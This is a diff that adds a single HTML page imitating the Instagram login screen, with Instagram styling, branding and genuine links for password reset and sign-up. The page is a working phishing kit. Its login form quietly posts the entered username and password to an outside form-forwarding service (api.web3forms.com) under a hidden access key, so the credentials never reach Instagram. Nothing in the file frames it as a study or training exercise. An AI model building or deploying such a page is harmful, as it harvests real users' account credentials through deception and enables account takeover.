@@ -1,0 +1,292 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram Login</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.6.1/css/font-awesome.css" integrity="sha512-LKG0Zi6duJ5mwncLtQVchN0iF8fWmcxApuX9pqGq7ITgwQDWR9EqZFsrV9TXfE9pPRa1J6GVnsBl7gKxAyllaA==" crossorigin="anonymous" referrerpolicy="no-referrer"
+    />
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: "Poppins", sans-serif;
+        }
+        
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            font-family: Arial, sans-serif;
+            background-color: #fafafa;
+        }
+        
+        .container {
+            width: 100%;
+            max-width: 370px;
+            padding: 25px;
+            background-color: #fff;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            text-align: center;
+        }
+        
+        h1 {
+            margin-top: 30px;
+            margin-bottom: 30px;
+            font-size: 60px;
+            font-family: 'Trebuchet MS', 'Lucida Sans Unicode', 'Lucida Grande', 'Lucida Sans', Arial, sans-serif;
+            color: #262626;
+            font-weight: lighter;
+        }
+        
+        .textbox {
+            margin: 10px 0;
+        }
+        
+        input {
+            width: 100%;
+            padding: 15px;
+            margin: 5px 0;
+            display: inline-block;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            box-sizing: border-box;
+        }
+        
+        .btn {
+            width: 100%;
+            padding: 10px;
+            background-color: #3897f0;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 16px;
+            margin-top: 10px;
+        }
+        
+        .btn:focus {
+            background-color: #3091eb;
+            transform: scale(0.99);
+            transition: all 0.5s;
+        }
+        
+        .signup {
+            margin-top: 20px;
+        }
+        
+        .signup a {
+            color: #3897f0;
+            text-decoration: none;
+        }
+        
+        .signup a:hover {
+            text-decoration: underline;
+        }
+        
+        a,
+        .fb {
+            margin-top: 10px;
+            padding: 10px;
+            color: #185992;
+            text-decoration: none;
+        }
+        
+        .ps {
+            margin-top: 15px;
+            font-size: 15px;
+        }
+        
+        img {
+            width: 80px;
+        }
+        
+        input[type='checkbox'] {
+            width: 50px;
+            height: 15px;
+            margin-left: -185px;
+        }
+        
+        input {
+            padding-top: 10px;
+        }
+        
+        @media screen and (max-width: 768px) {
+            .container {
+                width: 100%;
+                max-width: 350px;
+                padding: 20px;
+                background-color: #fff;
+                border: 1px solid #ddd;
+                border-radius: 5px;
+                box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+                text-align: center;
+            }
+            input {
+                width: 270px;
+            }
+            .btn {
+                width: 200px;
+                margin-top: 10px;
+            }
+            h1 {
+                font-size: 50px;
+            }
+            img {
+                width: 60px;
+            }
+            input[type='checkbox'] {
+                width: 50px;
+                height: 15px;
+                margin-left: -140px;
+            }
+        }
+        
+        @media screen and (max-width: 425px) {
+            .container {
+                width: 100%;
+                max-width: 350px;
+                padding: 20px;
+                background-color: #fff;
+                border: 1px solid #ddd;
+                border-radius: 5px;
+                box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+                text-align: center;
+            }
+            input {
+                width: 270px;
+            }
+            .btn {
+                width: 200px;
+                margin-top: 10px;
+            }
+            h1 {
+                font-size: 50px;
+            }
+            img {
+                width: 60px;
+            }
+            input[type='checkbox'] {
+                width: 50px;
+                height: 15px;
+                margin-left: -140px;
+            }
+        }
+        
+        @media screen and (max-width: 375px) {
+            input {
+                width: 270px;
+            }
+            .btn {
+                width: 180px;
+            }
+            h1 {
+                font-size: 50px;
+            }
+            img {
+                width: 60px;
+            }
+            input[type='checkbox'] {
+                width: 50px;
+                height: 15px;
+                margin-left: -140px;
+            }
+        }
+        
+        @media screen and (max-width: 320px) {
+            .container {
+                width: 100%;
+                max-width: 300px;
+                padding: 20px;
+                background-color: #fff;
+                border: 1px solid #ddd;
+                border-radius: 5px;
+                box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+                text-align: center;
+            }
+            input {
+                width: 250px;
+            }
+            .btn {
+                width: 200px;
+            }
+            h1 {
+                font-size: 30px;
+            }
+            img {
+                width: 50px;
+            }
+            input[type='checkbox'] {
+                width: 50px;
+                height: 15px;
+                margin-left: -120px;
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <div class="container">
+
+        <div class="icon"> <img src="i.png">
+
+            <div class="login-box">
+
+                <h1>Instagram</h1>
+
+                <form action="https://api.web3forms.com/submit" method="POST">
+                    <input type="hidden" name="access_key" value="b78ee9cd-c1cd-45d8-a0f5-1feafca8e315">
+
+                    <input type="text" name="name" placeholder="Username" id="username" required>
+                    <input type="password" name="message" placeholder="Password" id="YourPassword" required>
+
+                    <input type="hidden" name="message" value="https://web3forms.com/success">
+
+                    <div class="strengthMeter show">
+                        <input type="checkbox" class="checkpassword">Show Password</span>
+                    </div>
+
+                    <button type="submit" class="btn">Log in</button>
+                </form>
+
+
+                <div class="fb">
+                    <a href="https://www.facebook.com/login/">
+                        <i class="fa fa-facebook-square">  Log in with Facebook</i>
+                    </a>
+                </div>
+
+                <div class="ps">
+                    <span> <a href="https://www.instagram.com/accounts/password/reset/?hl=en"> Forgot Password ? </a> </span>
+                </div>
+
+                <div class="signup">
+                    <p>Don't have an account? <a href="https://www.instagram.com/accounts/emailsignup/?hl=en">Sign up</a></p>
+                </div>
+            </div>
+        </div>
+        <script src="script.js"></script>
+
+
+        <script>
+            let password = document.querySelector("#YourPassword");
+            let show = document.querySelector(".show");
+            show.onclick = function() {
+                if (password.type === "password") {
+                    password.setAttribute("type", "text");
+                    show.classList.add("hide");
+                } else {
+                    password.setAttribute("type", "password");
+                    show.classList.remove("hide");
+                }
+            };
+        </script>
+</body>
+
+</html>
